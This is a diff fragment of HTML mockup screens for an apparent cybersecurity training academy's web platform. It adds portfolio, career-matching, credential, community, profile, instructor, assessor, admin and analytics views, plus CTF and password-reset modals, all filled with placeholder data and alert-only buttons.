+                  <input type="text" class="form-control" placeholder="https://github.com/your-username/repo-name" value="https://github.com/andiwijaya/automata-siem-parser">
+                </div>
+                <button class="btn btn-primary" onclick="alert('Deliverable submitted successfully!')">Submit Project URL</button>
+              </div>
+            </div>
+            
+            <div>
+              <div class="card">
+                <h3 class="card-title">Assigned Mentor</h3>
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+                  <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?q=80&w=256&auto=format&fit=crop" alt="Mentor" style="width:48px; height:48px; border-radius:50%; object-fit:cover;">
+                  <div>
+                    <h4 style="font-size:14px;">Budi Santoso</h4>
+                    <span style="font-size:11px; color:var(--gray-500);">GRC Consultant & Auditor</span>
+                  </div>
+                </div>
+                <button class="btn btn-secondary btn-sm" style="width:100%;">Schedule Roster Sync</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 19: Portfolio Builder -->
+        <div id="view-portfolio" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Digital Portfolio Builder</h1>
+              <p class="screen-description">Select completed sandbox labs and projects to add to your public cybersecurity CV.</p>
+            </div>
+            <div style="display:flex; gap:12px;">
+              <button class="btn btn-secondary" onclick="alert('Portfolio PDF compilation triggered...')">Download PDF</button>
+              <button class="btn btn-primary" onclick="alert('Public Link Copied: https://academy.technotama.com/portfolio/andi-wijaya')">Publish Live URL</button>
+            </div>
+          </div>
+
+          <div class="grid-3-1">
+            <div>
+              <div class="portfolio-evidence-item">
+                <div class="portfolio-evidence-info">
+                  <div class="portfolio-evidence-icon"><i class="fa-solid fa-flask"></i></div>
+                  <div>
+                    <h4 style="font-size:14px; margin-bottom:2px;">Wireshark Packet Analysis Lab</h4>
+                    <span style="font-size:11px; color:var(--gray-500);">Completed on Jul 20, 2026 | Score: 96%</span>
+                  </div>
+                </div>
+                <span class="badge badge-green">Added</span>
+              </div>
+
+              <div class="portfolio-evidence-item">
+                <div class="portfolio-evidence-info">
+                  <div class="portfolio-evidence-icon"><i class="fa-solid fa-code"></i></div>
+                  <div>
+                    <h4 style="font-size:14px; margin-bottom:2px;">Python Port Scanner Development</h4>
+                    <span style="font-size:11px; color:var(--gray-500);">Completed on Jul 15, 2026 | Score: 88%</span>
+                  </div>
+                </div>
+                <button class="btn btn-secondary btn-sm" onclick="this.textContent='Added'; this.className='badge badge-green';">Add to CV</button>
+              </div>
+            </div>
+            
+            <div>
+              <div class="card">
+                <h3 class="card-title">Public Showcase</h3>
+                <p style="font-size:13px; color:var(--gray-600); margin-bottom:16px;">
+                  Toggle your public link so that recruitment partners can inspect your verified lab code credentials.
+                </p>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="font-size:13px; font-weight:600;">Showcase Visibility</span>
+                  <span style="color:var(--success); font-weight:700;"><i class="fa-solid fa-eye"></i> Live</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 20: Career Center & 21: Job Matching -->
+        <div id="view-career-center" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Career Match Center</h1>
+              <p class="screen-description">Browse employment openings curated specifically for your competency levels.</p>
+            </div>
+            <div class="card" style="padding:10px 20px; display:flex; align-items:center; gap:12px;">
+              <span style="font-size:11px; text-transform:uppercase; color:var(--gray-500);">Career Readiness</span>
+              <strong style="color:var(--gold-hover);">78% Score</strong>
+            </div>
+          </div>
+
+          <div class="grid-3-1">
+            <div>
+              <h3 style="margin-bottom:16px;">Job Postings For You</h3>
+              
+              <!-- Job Card 1 -->
+              <div class="card" style="margin-bottom:16px; padding:20px;">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:12px;">
+                  <div>
+                    <h3 style="font-size: 16px; color: var(--navy-deep);">Junior SOC Analyst</h3>
+                    <span style="font-size: 12px; color: var(--gray-500);"><i class="fa-solid fa-building"></i> SecureNet Technologies | Jakarta (Hybrid)</span>
+                  </div>
+                  <span class="badge badge-gold">92% Skill Match</span>
+                </div>
+                <p style="font-size:13px; color:var(--gray-600); margin-bottom:16px;">
+                  Monitor networks for intrusion indicators, parse firewall packets, and triage security incident tickets.
+                </p>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="font-size:12px; color:var(--gray-500);">Salary: Rp 8.000.000 - Rp 11.000.000</span>
+                  <button class="btn btn-primary btn-sm" onclick="alert('Application Sent! We submitted your Technotama transcript record automatically.')">Apply with Transcript</button>
+                </div>
+              </div>
+
+              <!-- Job Card 2 -->
+              <div class="card" style="margin-bottom:16px; padding:20px;">
+                <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:12px;">
+                  <div>
+                    <h3 style="font-size: 16px; color: var(--navy-deep);">Junior Network Security Engineer</h3>
+                    <span style="font-size: 12px; color: var(--gray-500);"><i class="fa-solid fa-building"></i> Global Cyber Corp | Surabaya (On-site)</span>
+                  </div>
+                  <span class="badge badge-blue">74% Skill Match</span>
+                </div>
+                <p style="font-size:13px; color:var(--gray-600); margin-bottom:16px;">
+                  Configure firewalls, monitor VPN tunnels, and support infrastructure vulnerability assessments.
+                </p>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="font-size:12px; color:var(--gray-500);">Salary: Rp 7.500.000 - Rp 9.500.000</span>
+                  <button class="btn btn-primary btn-sm" onclick="alert('Application Sent!')">Apply with Transcript</button>
+                </div>
+              </div>
+            </div>
+            
+            <div>
+              <div class="card" style="margin-bottom:16px;">
+                <h3 class="card-title">Talent Pool Status</h3>
+                <p style="font-size:12px; color:var(--gray-600); margin-bottom:16px;">
+                  Your profile has been shared with <strong>12 Partner Corporations</strong>.
+                </p>
+                <div style="display:flex; align-items:center; gap:8px; font-size:12px; font-weight:700;">
+                  <span class="status-dot" style="position:static; display:inline-block;"></span>
+                  <span>Active & Recruiting</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 22 & 23: Credentials (Certificate & Badge Center) -->
+        <div id="view-credentials" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Credential Wallet</h1>
+              <p class="screen-description">Review earned qualifications, digital badges, and verified transcripts.</p>
+            </div>
+          </div>
+
+          <div class="tab-container">
+            <div class="tab-nav">
+              <button class="tab-link active" onclick="toggleCredentialTab('certs')">Certificates</button>
+              <button class="tab-link" onclick="toggleCredentialTab('badges')">Badges Vault</button>
+            </div>
+
+            <div class="tab-content active" id="credential-tab-certs">
+              <!-- Certificate of Completion -->
+              <div class="certificate-preview-box">
+                <div class="certificate-header">Technotama Cybersecurity Academy</div>
+                <div>
+                  <span style="font-size: 11px; color: var(--gray-400); text-transform: uppercase; letter-spacing: 1px;">This is to certify that</span>
+                  <div class="certificate-recipient">Andi Wijaya</div>
+                  <p class="certificate-text">has successfully satisfied the graduation criteria for Level 1 Foundation program</p>
+                  <div class="certificate-course">Cybersecurity Operations Foundation</div>
+                </div>
+                
+                <div class="certificate-seal">VERIFIED<br>GRADUATE</div>
+                
+                <div class="certificate-footer-info">
+                  <span>Issued Date: Jul 20, 2026</span>
+                  <span class="certificate-verify-tag">Credential ID: TT-8021-994A</span>
+                </div>
+              </div>
+              
+              <div style="text-align:center; margin-top:24px;">
+                <button class="btn btn-primary" onclick="alert('LinkedIn share simulation opened...')"><i class="fa-brands fa-linkedin"></i> Share on LinkedIn</button>
+              </div>
+            </div>
+
+            <div class="tab-content" id="credential-tab-badges">
+              <div class="badge-vault">
+                <div class="vault-badge-item unlocked">
+                  <div class="badge-art">🐧</div>
+                  <div class="vault-badge-name">Linux Starter</div>
+                  <span style="font-size:10px; color:var(--gray-500);">XP +100</span>
+                </div>
+                <div class="vault-badge-item unlocked">
+                  <div class="badge-art">🔬</div>
+                  <div class="vault-badge-name">Packet Hunter</div>
+                  <span style="font-size:10px; color:var(--gray-500);">XP +200</span>
+                </div>
+                <div class="vault-badge-item">
+                  <div class="badge-art">🛡️</div>
+                  <div class="vault-badge-name">SOC Operator</div>
+                  <span style="font-size:10px; color:var(--gray-500);">Locked</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 24: Community Space -->
+        <div id="view-community" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Community Board</h1>
+              <p class="screen-description">Discuss network anomalies, post technical question boards, and network with peers.</p>
+            </div>
+            <button class="btn btn-primary" onclick="alert('Thread creation modal simulation')">Create Topic <i class="fa-solid fa-plus"></i></button>
+          </div>
+
+          <div class="community-layout">
+            <div>
+              <!-- Forum Post 1 -->
+              <div class="post-card">
+                <div class="post-header">
+                  <div class="post-user">
+                    <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=256&auto=format&fit=crop" alt="User" style="width:32px; height:32px; border-radius:50%; object-fit:cover;">
+                    <div>
+                      <strong>Andi Wijaya</strong>
+                      <span style="font-size:11px; color:var(--gray-500); display:block;">Posted 1 hour ago</span>
+                    </div>
+                  </div>
+                  <span class="badge badge-blue">Wireshark Lab</span>
+                </div>
+                <h3 class="post-title">Help needed extracting cleartext password from stream 3</h3>
+                <p style="font-size:13px; color:var(--gray-600);">
+                  I am running tshark command, but stream 3 output is showing junk characters. Is anyone else experiencing payload compression on this target trace?
+                </p>
+                <div class="post-meta">
+                  <span><i class="fa-solid fa-comment"></i> 4 Replies</span>
+                  <span><i class="fa-solid fa-thumbs-up"></i> 12 Upvotes</span>
+                </div>
+              </div>
+
+              <!-- Forum Post 2 -->
+              <div class="post-card">
+                <div class="post-header">
+                  <div class="post-user">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=256&auto=format&fit=crop" alt="User" style="width:32px; height:32px; border-radius:50%; object-fit:cover;">
+                    <div>
+                      <strong>Erika Pratiwi (Mentor)</strong>
+                      <span style="font-size:11px; color:var(--gray-500); display:block;">Pinned discussion</span>
+                    </div>
+                  </div>
+                  <span class="badge badge-gold">Announcement</span>
+                </div>
+                <h3 class="post-title">Weekly Blue Team Meetup Scheduled</h3>
+                <p style="font-size:13px; color:var(--gray-600);">
+                  We will run a live threat-modeling session this Thursday at 19:00 WIB. Ensure your Kali Sandbox is updated to the latest revision.
+                </p>
+                <div class="post-meta">
+                  <span><i class="fa-solid fa-comment"></i> 18 Replies</span>
+                  <span><i class="fa-solid fa-thumbs-up"></i> 45 Upvotes</span>
+                </div>
+              </div>
+            </div>
+            
+            <div>
+              <div class="card">
+                <h3 class="card-title">Online Mentors</h3>
+                <ul style="list-style:none; display:flex; flex-direction:column; gap:12px;">
+                  <li style="display:flex; align-items:center; gap:8px;">
+                    <span class="status-dot" style="position:static; display:inline-block;"></span>
+                    <span style="font-size:13px; font-weight:600;">Erika Pratiwi</span>
+                  </li>
+                  <li style="display:flex; align-items:center; gap:8px;">
+                    <span class="status-dot" style="position:static; display:inline-block;"></span>
+                    <span style="font-size:13px; font-weight:600;">Budi Santoso</span>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 26: Student Profile -->
+        <div id="view-profile" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Student Profile</h1>
+              <p class="screen-description">Your official verified cybersecurity practitioner identity sheet.</p>
+            </div>
+          </div>
+
+          <div class="grid-3-1">
+            <div>
+              <div class="card" style="margin-bottom:24px;">
+                <div style="display:flex; align-items:center; gap:20px; border-bottom:1px solid var(--gray-200); padding-bottom:20px; margin-bottom:20px;">
+                  <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=256&auto=format&fit=crop" alt="Avatar" style="width:80px; height:80px; border-radius:50%; object-fit:cover;">
+                  <div>
+                    <h2 id="prof-name">Andi Wijaya</h2>
+                    <span style="color:var(--gray-500); font-size:14px;">SOC Analyst Target | Level 1 Foundation</span>
+                  </div>
+                </div>
+                
+                <h3 style="font-size:16px; margin-bottom:12px;">Competencies Overview</h3>
+                <div style="display:flex; flex-direction:column; gap:12px;">
+                  <div>
+                    <div style="display:flex; justify-content:space-between; font-size:12px; margin-bottom:4px;">
+                      <span>Security Foundations</span>
+                      <strong>80% (KOMPETEN)</strong>
+                    </div>
+                    <div class="progress-bar-bg" style="height:6px;"><div class="progress-bar-fill success" style="width:80%;"></div></div>
+                  </div>
+                  <div>
+                    <div style="display:flex; justify-content:space-between; font-size:12px; margin-bottom:4px;">
+                      <span>Traffic Auditing</span>
+                      <strong>72% (KOMPETEN)</strong>
+                    </div>
+                    <div class="progress-bar-bg" style="height:6px;"><div class="progress-bar-fill success" style="width:72%;"></div></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <div>
+              <div class="card">
+                <h3 class="card-title">Stats</h3>
+                <ul style="list-style:none; display:flex; flex-direction:column; gap:8px; font-size:13px; color:var(--gray-600);">
+                  <li>XP Earned: <strong>1,250 XP</strong></li>
+                  <li>Streak: <strong>5 Days</strong></li>
+                  <li>Labs completed: <strong>6</strong></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ================= MANAGEMENT VIEW SCREENS ================= -->
+        
+        <!-- Screen 27: Instructor Dashboard -->
+        <div id="view-instructor-dashboard" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Instructor Analytics Board</h1>
+              <p class="screen-description">Track class cohort metrics, review submission bottlenecks, and triage at-risk learners.</p>
+            </div>
+          </div>
+
+          <div class="stat-card-row">
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">124</span>
+                <span class="stat-card-title">Enrolled Students</span>
+              </div>
+              <div class="stat-card-icon"><i class="fa-solid fa-users"></i></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">88%</span>
+                <span class="stat-card-title">Avg Lab Progress</span>
+              </div>
+              <div class="stat-card-icon"><i class="fa-solid fa-percent"></i></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">4</span>
+                <span class="stat-card-title">At-Risk Students</span>
+              </div>
+              <div class="stat-card-icon" style="color:var(--danger); background-color:var(--danger-bg);"><i class="fa-solid fa-triangle-exclamation"></i></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">12</span>
+                <span class="stat-card-title">Awaiting Review</span>
+              </div>
+              <div class="stat-card-icon" style="color:var(--warning); background-color:var(--warning-bg);"><i class="fa-solid fa-clock"></i></div>
+            </div>
+          </div>
+
+          <div class="card">
+            <h3 class="card-title">Awaiting Assessment Submissions</h3>
+            <table style="width:100%; border-collapse:collapse; text-align:left; font-size:14px;">
+              <thead>
+                <tr style="border-bottom:2px solid var(--gray-200); font-weight:700;">
+                  <th style="padding:12px 8px;">Student</th>
+                  <th style="padding:12px 8px;">Course Module</th>
+                  <th style="padding:12px 8px;">Task Name</th>
+                  <th style="padding:12px 8px;">Submitted Date</th>
+                  <th style="padding:12px 8px;">Action</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="border-bottom:1px solid var(--gray-100);">
+                  <td style="padding:12px 8px; font-weight:600;">Budiman Perkasa</td>
+                  <td style="padding:12px 8px;">Level 1 Basic</td>
+                  <td style="padding:12px 8px;">Traffic Analysis Case Study 1</td>
+                  <td style="padding:12px 8px;">Jul 27, 2026</td>
+                  <td style="padding:12px 8px;"><button class="btn btn-primary btn-sm" onclick="showScreenDirect('assessor-dashboard')">Assess Report</button></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Screen 28: Assessor Dashboard -->
+        <div id="view-assessor-dashboard" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Assessor Evaluation Workbench</h1>
+              <p class="screen-description">Grade and submit feedback for student portfolios, lab checksheets, and reports.</p>
+            </div>
+          </div>
+
+          <div class="grid-3-1">
+            <div>
+              <div class="card" style="margin-bottom:24px;">
+                <h3 class="card-title">Evaluate Submission: Traffic Analysis Case Study</h3>
+                
+                <div style="background-color:var(--gray-50); border:1px solid var(--gray-200); border-radius:var(--radius-md); padding:16px; margin-bottom:20px; font-size:13px;">
+                  <strong>Student:</strong> Budiman Perkasa<br>
+                  <strong>Delivered Link:</strong> <a href="#" style="color:var(--navy-light); font-weight:700;">case-study-submission.pdf</a>
+                </div>
+
+                <div class="form-group">
+                  <label class="form-label">Competency Score (0 - 100)</label>
+                  <input type="number" class="form-control" placeholder="85" style="width:120px;" id="eval-score">
+                </div>
+                
+                <div class="form-group">
+                  <label class="form-label">Feedback Review Remarks</label>
+                  <textarea class="form-control" style="height:100px;" placeholder="Great packet trace analysis. Suggest highlighting stream ports next time."></textarea>
+                </div>
+                
+                <button class="btn btn-primary" onclick="alert('Evaluation logged successfully! The student record has been updated.'); showScreenDirect('instructor-dashboard')">Submit Score & Feedback</button>
+              </div>
+            </div>
+            
+            <div>
+              <div class="card">
+                <h3 class="card-title">Rubric Guide</h3>
+                <ul style="list-style:none; font-size:12px; display:flex; flex-direction:column; gap:12px;">
+                  <li><strong>90-100:</strong> MAHIR (Demonstrated precision and independence)</li>
+                  <li><strong>70-89:</strong> KOMPETEN (Meets core module assessment criteria)</li>
+                  <li><strong>50-69:</strong> CUKUP (Needs minor tutoring strengthening)</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 29: Admin Panel -->
+        <div id="view-admin-dashboard" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Administration Console</h1>
+              <p class="screen-description">Configure infrastructure instances, adjust curriculum timelines, and audit accounts.</p>
+            </div>
+          </div>
+
+          <div class="grid-2" style="margin-bottom:24px;">
+            <div class="card">
+              <h3 class="card-title">System & Range Status</h3>
+              <ul style="list-style:none; font-size:13px; display:flex; flex-direction:column; gap:12px;">
+                <li style="display:flex; justify-content:space-between;">
+                  <span>Active Sandbox instances:</span>
+                  <strong>142 VMs Online</strong>
+                </li>
+                <li style="display:flex; justify-content:space-between;">
+                  <span>Hypervisor Health:</span>
+                  <span style="color:var(--success); font-weight:700;"><i class="fa-solid fa-circle-check"></i> Nominal</span>
+                </li>
+              </ul>
+              <button class="btn btn-secondary btn-sm" style="width:100%; margin-top:20px;">Range Management Console</button>
+            </div>
+
+            <div class="card">
+              <h3 class="card-title">Course Management</h3>
+              <ul style="list-style:none; font-size:13px; display:flex; flex-direction:column; gap:12px;">
+                <li style="display:flex; justify-content:space-between;">
+                  <span>Active Curriculum Modules:</span>
+                  <strong>8 Tracks</strong>
+                </li>
+                <li style="display:flex; justify-content:space-between;">
+                  <span>Enrolled Cohorts:</span>
+                  <strong>Batch 4 & Batch 5</strong>
+                </li>
+              </ul>
+              <button class="btn btn-secondary btn-sm" style="width:100%; margin-top:20px;">Curriculum Map Designer</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Screen 30: Analytics Dashboard -->
+        <div id="view-analytics-dashboard" class="screen">
+          <div class="screen-header">
+            <div>
+              <h1>Executive Analytics Dashboard</h1>
+              <p class="screen-description">Overall performance dashboard of Technotama Cybersecurity Academy cohort placements.</p>
+            </div>
+          </div>
+
+          <div class="stat-card-row">
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">94.2%</span>
+                <span class="stat-card-title">Completion Rate</span>
+              </div>
+              <div class="stat-card-icon"><i class="fa-solid fa-graduation-cap"></i></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">82.1%</span>
+                <span class="stat-card-title">Employment Match</span>
+              </div>
+              <div class="stat-card-icon"><i class="fa-solid fa-briefcase"></i></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">24 mins</span>
+                <span class="stat-card-title">Avg Lab Resolve Time</span>
+              </div>
+              <div class="stat-card-icon"><i class="fa-solid fa-stopwatch"></i></div>
+            </div>
+            <div class="stat-card">
+              <div class="stat-card-left">
+                <span class="stat-card-number">Rp 9.2M</span>
+                <span class="stat-card-title">Avg Starting Salary</span>
+              </div>
+              <div class="stat-card-icon"><i class="fa-solid fa-wallet"></i></div>
+            </div>
+          </div>
+
+          <div class="card">
+            <h3 class="card-title">Competency Distribution Cohorts</h3>
+            <p style="font-size:13px; color:var(--gray-500); margin-bottom:20px;">
+              Visual representation of graduation standards across all cohorts.
+            </p>
+            <!-- Custom HTML bars representing a vertical histogram graph -->
+            <div style="display:flex; justify-content:space-around; align-items:flex-end; height:180px; padding-top:20px; border-bottom:1px solid var(--gray-200);">
+              <div style="display:flex; flex-direction:column; align-items:center;">
+                <div style="background-color:var(--navy-deep); width:40px; height:120px; border-radius:4px 4px 0 0;"></div>
+                <span style="font-size:11px; margin-top:8px;">Networking</span>
+              </div>
+              <div style="display:flex; flex-direction:column; align-items:center;">
+                <div style="background-color:var(--gold); width:40px; height:140px; border-radius:4px 4px 0 0;"></div>
+                <span style="font-size:11px; margin-top:8px;">Linux</span>
+              </div>
+              <div style="display:flex; flex-direction:column; align-items:center;">
+                <div style="background-color:var(--navy-deep); width:40px; height:90px; border-radius:4px 4px 0 0;"></div>
+                <span style="font-size:11px; margin-top:8px;">Threat analysis</span>
+              </div>
+              <div style="display:flex; flex-direction:column; align-items:center;">
+                <div style="background-color:var(--gray-400); width:40px; height:60px; border-radius:4px 4px 0 0;"></div>
+                <span style="font-size:11px; margin-top:8px;">Scripting</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+
+    <!-- Mobile Bottom Navigation (Hidden on Desktop) -->
+    <nav class="mobile-bottom-nav">
+      <a href="#" class="mobile-nav-item active" onclick="navigateTo('dashboard', this)">
+        <i class="fa-solid fa-gauge-high"></i>
+        <span>Dashboard</span>
+      </a>
+      <a href="#" class="mobile-nav-item" onclick="navigateTo('learning-path', this)">
+        <i class="fa-solid fa-road"></i>
+        <span>Path</span>
+      </a>
+      <a href="#" class="mobile-nav-item" onclick="navigateTo('cyber-lab', this)">
+        <i class="fa-solid fa-flask"></i>
+        <span>Labs</span>
+      </a>
+      <a href="#" class="mobile-nav-item" onclick="navigateTo('profile', this)">
+        <i class="fa-solid fa-user"></i>
+        <span>Profile</span>
+      </a>
+    </nav>
+
+  </div>
+
+  <!-- ================= CTF MODAL DIALOG SIMULATOR ================= -->
+  <div class="modal-backdrop" id="ctf-modal">
+    <div class="modal-card">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <h3 id="ctf-modal-title">Solve Capture The Flag</h3>
+        <button onclick="closeCtfSimulator()" style="font-size:20px; color:var(--gray-500);"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <p style="font-size:13px; color:var(--gray-600); margin-bottom:16px;">
+        Download the files, identify the flag, and submit it below to unlock completion score XP.
+      </p>
+      <div style="background-color:var(--gray-100); padding:12px; border-radius:var(--radius-md); font-size:12px; margin-bottom:20px;">
+        <strong>Download challenge payload:</strong> <a href="#" style="color:var(--navy-light); font-weight:700;"><i class="fa-solid fa-file-shield"></i> packet-dump.pcap</a>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Enter Flag String</label>
+        <input type="text" id="ctf-flag-input" class="form-control" placeholder="FLAG{xxxx_xxxx_xxxx}">
+      </div>
+      <button class="btn btn-primary" style="width:100%;" onclick="submitCtfFlag()">Submit Flag Credentials</button>
+    </div>
+  </div>
+
+  <!-- ================= FORGOT PASSWORD MODAL ================= -->
+  <div class="modal-backdrop" id="forgot-password-modal">
+    <div class="modal-card">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <h3>Reset Password</h3>
+        <button onclick="closeForgotPasswordModal()" style="font-size:20px; color:var(--gray-500);"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <p style="font-size:13px; color:var(--gray-600); margin-bottom:16px;">
+        Masukkan email Anda yang terdaftar untuk menerima link instruksi reset password.
+      </p>
+      <div id="forgot-password-success-msg" class="alert alert-success" style="display: none; margin-bottom: 20px; font-size: 13px; padding: 10px 14px;">
+        <i class="fa-solid fa-circle-check" style="font-size: 16px;"></i>
+        <span>Link reset password telah dikirim ke email Anda! Silakan cek folder inbox atau spam Anda.</span>
+      </div>
+      <form id="forgot-password-form" onsubmit="event.preventDefault(); submitForgotPassword();">
+        <div class="form-group">
+          <label class="form-label">Email Address</label>
+          <input type="email" id="forgot-email" class="form-control" placeholder="name@domain.com" required>
+        </div>
+        <button type="submit" class="btn btn-primary" style="width:100%;" id="btn-submit-forgot">Kirim Link Reset</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- JavaScript application script -->
+  <script src="app.js"></script>
+</body>
+</html>
